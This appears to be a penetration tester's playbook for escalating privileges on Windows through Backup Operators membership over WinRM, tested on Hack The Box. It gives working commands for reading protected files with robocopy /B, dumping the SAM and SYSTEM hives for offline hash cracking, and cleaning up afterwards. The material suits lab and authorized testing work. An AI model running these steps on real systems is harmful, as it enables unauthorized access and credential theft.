# Backup Operators Privilege Escalation via WinRM

## When to use

- Compromised account is a member of the Backup Operators group
- Account also has Remote Management Users membership (WinRM access)
- Goal: read protected files (flags, SAM hives, sensitive data) or escalate to SYSTEM
- Target is a standalone workstation or server (domain or local accounts)

## Tags

- ATT&CK: T1003.002 (SAM), T1078.001 (Default Accounts), T1098 (Account Manipulation)
- Platform: Windows
- Services: WinRM (TCP 5985/5986)
- Privileges: Backup Operators, Remote Management Users

## How it works

Backup Operators have `SeBackupPrivilege` and `SeRestorePrivilege`, which allow
reading any file on the system regardless of NTFS ACLs (using backup semantics).
Combined with WinRM access, this allows reading Administrator files, SAM/SYSTEM
hives, or NTDS.dit.

## Prerequisites

- Valid credentials for the Backup Operators account
- Evil-WinRM or equivalent WinRM client (NOT PowerShell `Invoke-Command`)
- Target must have WinRM enabled (default on Windows Server, common on Pro/Enterprise)

## Connecting with full privileges

**Use Evil-WinRM, not PowerShell remoting.** This is the critical step.

```bash
evil-winrm -i <target> -u <username> -p '<password>'
```

Verify privileges are enabled (not just present):

```powershell
whoami /priv
# SeBackupPrivilege     Back up files and directories   Enabled
# SeRestorePrivilege    Restore files and directories   Enabled
```

## Reading protected files

```powershell
# Copy any file using backup semantics
robocopy /B C:\Users\Administrator\Desktop C:\Users\<you>\Documents root.txt

# Read the copied file
type C:\Users\<you>\Documents\root.txt
```

## Dumping SAM/SYSTEM for offline hash cracking

```powershell
reg save HKLM\SAM C:\Users\<you>\Documents\sam.hiv
reg save HKLM\SYSTEM C:\Users\<you>\Documents\system.hiv
```

Then download and crack with `secretsdump.py` or `samdump2`.

## Operational notes

**PowerShell Invoke-Command strips privileges.** `Invoke-Command -ComputerName
localhost -Credential $cred` creates a WinRM loopback session with a **filtered
admin token**. UAC token filtering removes SeBackupPrivilege and SeRestorePrivilege
from the token entirely. `AdjustTokenPrivileges` cannot re-enable them because
they're not disabled - they're gone. This also applies to `Enter-PSSession` with
localhost.

Scheduled tasks created with `schtasks /create /ru <backup_user>` may also fail
because the task runs with a batch logon token that lacks the privileges.

**Evil-WinRM works because** it connects externally (even to 127.0.0.1) and the
WinRM service gives the connecting user an unfiltered token with all group
privileges enabled by default.

**robocopy /B vs normal copy.** Standard `copy` and `Get-Content` do not use backup
semantics. You must use `robocopy /B` (or `/ZB` for restartable + backup mode),
or open files with `FILE_FLAG_BACKUP_SEMANTICS` (0x02000000) via the Win32 API.

## Cleanup

Remove any copied files from the target:

```powershell
del C:\Users\<you>\Documents\root.txt
del C:\Users\<you>\Documents\sam.hiv
del C:\Users\<you>\Documents\system.hiv
```

## Proven on

- Windows 11 Pro Build 26100 (HTB, 2026-11-11): Evil-WinRM from Kali container, robocopy /B for file read
